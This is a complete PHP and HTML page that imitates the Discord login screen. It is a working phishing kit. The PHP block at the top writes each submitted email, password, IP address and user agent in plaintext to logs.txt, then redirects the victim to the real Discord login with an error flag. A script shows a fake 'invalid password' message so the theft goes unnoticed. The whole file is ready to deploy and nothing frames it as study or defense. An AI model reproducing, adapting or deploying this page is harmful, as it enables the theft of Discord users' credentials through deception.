<?php
// Logging function
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $timestamp = date('Y-m-d H:i:s');
    
    $logEntry = "[$timestamp] IP: $ip | Email: $email | Password: $password | UA: $userAgent\n";
    file_put_contents('logs.txt', $logEntry, FILE_APPEND);
    
    // Redirect to real Discord with error
    header('Location: https://discord.com/login?error=credentials');
    exit();
}
?>

<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Log In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #1e1f22;
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .authBox {
            background: #2b2d31;
            border-radius: 8px;
            padding: 32px;
            width: 100%;
            max-width: 480px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
        }
        
        .discordLogo {
            text-align: center;
            margin-bottom: 32px;
            font-size: 32px;
            font-weight: bold;
            color: #fff;
        }
        
        .discordLogo span {
            background: #5865f2;
            padding: 8px 16px;
            border-radius: 8px;
        }
        
        h1 {
            color: #fff;
            font-size: 24px;
            margin-bottom: 8px;
            text-align: center;
        }
        
        .subtitle {
            color: #b5bac1;
            margin-bottom: 24px;
            text-align: center;
            font-size: 16px;
        }
        
        .inputGroup {
            margin-bottom: 20px;
        }
        
        label {
            color: #b5bac1;
            font-size: 12px;
            font-weight: 600;
            display: block;
            margin-bottom: 8px;
        }
        
        input {
            width: 100%;
            padding: 12px;
            background: #1e1f22;
            border: 1px solid #1e1f22;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        
        input:focus {
            outline: none;
            border-color: #5865f2;
        }
        
        button {
            width: 100%;
            padding: 12px;
            background: #5865f2;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 8px;
            transition: background 0.2s;
        }
        
        button:hover {
            background: #4752c4;
        }
        
        .error {
            color: #fa777c;
            font-size: 12px;
            margin-top: 12px;
            text-align: center;
            display: none;
        }
        
        .qrLink {
            text-align: center;
            margin-top: 24px;
            padding-top: 16px;
            border-top: 1px solid #3b3f48;
        }
        
        .qrLink a {
            color: #00a8fc;
            text-decoration: none;
            font-size: 14px;
        }
        
        .qrLink a:hover {
            text-decoration: underline;
        }
        
        .registerLink {
            text-align: center;
            margin-top: 16px;
            font-size: 14px;
            color: #b5bac1;
        }
        
        .registerLink a {
            color: #00a8fc;
            text-decoration: none;
            margin-left: 4px;
        }
        
        .registerLink a:hover {
            text-decoration: underline;
        }
        
        .forgotLink {
            text-align: right;
            margin-top: 4px;
        }
        
        .forgotLink a {
            color: #00a8fc;
            text-decoration: none;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="authBox">
        <div class="discordLogo">
            <span>Discord</span>
        </div>
        
        <h1>Welcome back!</h1>
        <div class="subtitle">We're so excited to see you again!</div>
        
        <form method="POST" action="">
            <div class="inputGroup">
                <label>Email or Phone Number <span style="color:#fa777c;">*</span></label>
                <input type="text" name="email" required autocomplete="off" placeholder=" " autofocus>
            </div>
            
            <div class="inputGroup">
                <label>Password <span style="color:#fa777c;">*</span></label>
                <input type="password" name="password" required>
            </div>
            
            <div class="forgotLink">
                <a href="#">Forgot your password?</a>
            </div>
            
            <button type="submit">Log In</button>
            
            <div class="error" id="errorMsg">
                Invalid email or password. Please try again.
            </div>
        </form>
        
        <div class="qrLink">
            <a href="#">Or, sign in with QR Code</a>
        </div>
        
        <div class="registerLink">
            Need an account?
            <a href="#">Register</a>
        </div>
    </div>
    
    <script>
        // Re-enable right-click (overrides any Discord protection)
        window.addEventListener('contextmenu', function(e) {
            e.stopPropagation();
            return true;
        }, true);
        
        // Show fake error after form submit to make it realistic
        const form = document.querySelector('form');
        form.addEventListener('submit', function(e) {
            // Let the form submit normally to PHP
            setTimeout(function() {
                document.getElementById('errorMsg').style.display = 'block';
            }, 100);
        });
    </script>
</body>
</html>
